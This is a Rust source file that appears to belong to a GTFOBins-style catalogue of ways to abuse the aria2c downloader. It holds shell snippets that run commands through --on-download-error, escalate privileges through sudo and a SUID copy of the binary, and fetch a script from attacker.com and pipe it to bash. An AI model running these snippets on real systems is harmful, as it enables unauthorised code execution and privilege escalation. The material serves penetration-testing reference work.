pub static BIN_NAME: &'static str = "aria2c";
pub static BIN_DESC: &'static str =
    "Note that the subprocess is immediately sent to the background";

static COMMAND_CODE_1: &'static str = r#"
    
    COMMAND='id'
    TF=$(mktemp)
    echo "$COMMAND" > $TF
    chmod +x $TF
    aria2c --on-download-error=$TF http://x
"#;
pub static COMMAND_DESC_2: &'static str = "The remote file `aaaaaaaaaaaaaaaa` (must be a string of 16 hex digit) contains the shell script. Note that said file needs to be written on disk in order to be executed. `--allow-overwrite` is needed if this is executed multiple times with the same GID.";
static COMMAND_CODE_2: &'static str = r#"
    
    aria2c --allow-overwrite --gid=aaaaaaaaaaaaaaaa --on-download-complete=bash http://attacker.com/aaaaaaaaaaaaaaaa
"#;
pub static FD_DESC: &'static str =
    "Fetch a remote file via HTTP GET request. Use `--allow-overwrite` if needed.";
static FD_CODE: &'static str = r#"
    
    URL=http://attacker.com/file_to_get
    LFILE=file_to_save
    aria2c -o "$LFILE" "$URL"
"#;
static SUDO_CODE: &'static str = r#"
    
    COMMAND='id'
    TF=$(mktemp)
    echo "$COMMAND" > $TF
    chmod +x $TF
    sudo aria2c --on-download-error=$TF http://x
"#;
static LSUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which aria2c) .

    COMMAND='id'
    TF=$(mktemp)
    echo "$COMMAND" > $TF
    chmod +x $TF
    ./aria2c --on-download-error=$TF http://x
"#;
use crate::code::{Code, Tag};
pub static CMD_1: Code<'static> = Code {
    title: "CMD_CODE_1",
    code: COMMAND_CODE_1,
    tag: Tag::CMD,
};
pub static CMD_2: Code<'static> = Code {
    title: "CMD_CODE_2",
    code: COMMAND_CODE_2,
    tag: Tag::CMD,
};
pub static FD: Code<'static> = Code {
    title: "FD_CODE",
    code: FD_CODE,
    tag: Tag::FD,
};
pub static SUDO: Code<'static> = Code {
    title: "SUDO_CODE",
    code: SUDO_CODE,
    tag: Tag::SUDO,
};
pub static LSUID: Code<'static> = Code {
    title: "LSUID_CODE",
    code: LSUID_CODE,
    tag: Tag::LSUID,
};
